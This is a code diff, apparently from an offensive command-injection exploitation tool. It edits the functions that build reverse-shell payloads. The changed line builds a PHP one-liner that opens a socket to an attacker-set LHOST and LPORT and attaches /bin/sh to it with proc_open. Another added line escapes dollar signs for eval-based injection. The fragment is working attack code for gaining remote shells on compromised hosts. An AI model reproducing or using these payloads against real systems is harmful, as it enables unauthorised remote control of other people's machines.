@@ -116,7 +116,7 @@ def other_reverse_shells(separator):
     # PHP-reverse-shell
     if other_shell == '1':
       other_shell = "php -r '$sock=fsockopen(\"" + settings.LHOST + "\"," + settings.LPORT + ");" \
-                    "exec(\"/bin/sh -i <%263 >%263 2>%263\");'"
+                    "$proc=proc_open(\"/bin/sh -i\",array(0%3d>$sock,1%3d>$sock,2%3d>$sock),$pipes);'"
       break
 
     # Perl-reverse-shell
@@ -500,6 +500,8 @@ def reverse_tcp_options(separator):
     # Option 2 - Other (Netcat-Without-Netcat) shells
     elif reverse_tcp_option == '2' :
       reverse_tcp_option = other_reverse_shells(separator)
+      if settings.EVAL_BASED_STATE != False:
+        reverse_tcp_option = reverse_tcp_option.replace("$","\\$")
       if reverse_tcp_option.lower() not in settings.SHELL_OPTIONS:
         checks.shell_success("reverse")
         break
